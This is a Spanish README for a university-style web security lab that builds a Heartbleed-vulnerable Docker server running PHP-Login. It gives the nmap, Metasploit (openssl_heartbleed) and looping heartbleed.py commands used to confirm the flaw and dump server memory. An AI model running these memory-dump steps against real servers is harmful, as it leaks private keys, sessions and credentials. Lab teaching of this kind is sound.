# Seguridad de Aplicaciones Web

Una vez clonado, actualizar los submodulos de los que depende la prueba de concepto

```bash
git submodule init
git submodule update
```

## Pasos para levantar el entorno de pruebas

Construir la imagen en Docker:

```bash	
docker build -t heartbleed-image-websegapp .
```

Crear un contenedor en base a la imagen abriendo los puertos y exponiendo los volumenes internos:

```bash
docker run  -p 80:80 -p 443:443 -e LOG_STDOUT=true -e LOG_STDERR=true -e LOG_LEVEL=debug -v ${PWD}/data/PHP-Login:/var/www/html  -v ${PWD}/data/mysql:/var/lib/mysql  --name heartbleed-server heartbleed-image-websegapp
```

Instalar el sistema via explorador https://localhost/install y hacerlo en modo 'Automatico':

```
	- Database Hostname: 127.0.0.1
	- DB User: phplg
	- DB Password: password1234
	- DB Name: phpLogin
	- DB Table Prefix: phplg
	- Root Install Path: /var/www/html
	- Base Url: https://localhost/
	- Superadmin Username: admin
	- Superadmin Email: a@a.com
	- New Password: password1234
	- Repeat Password: password1234
```
## Verificar si el servidor es vulnerable 

Con NMAP:

```bash
nmap -sV –script=ssl-heartbleed
```

Con MSF:
```bash
msfconsole
```

Usamos el plugin para explotar la vulnerabilidad:
```bash
use auxiliary/scanner/ssl/openssl_heartbleed
```

Establecer el servidor victima y ponemos en modo dump el plugin:

```bash
set RHOSTS localhost
set verbose true
```

Explotamos la vulnerabilidad:

```bash
exploit
```

## Hacer dump de la memoria del servidor HTTP vulnerable:

Requisito: tener instalado python 2.7

Creamos el archivo donde vamos a hacer dump del servidor y vemos que va pasando en vivo:

```bash
truncate -s0 /tmp/heartbleed.out && tail -f /tmp/heartbleed.out
```

Ejecutamos el exploit cada un segundo y volcamos el contenido:

```bash
while true; do python heartbleed.py localhost >> /tmp/heartbleed.out; sleep 1; done
```

## License
[MIT](https://choosealicense.com/licenses/mit/)

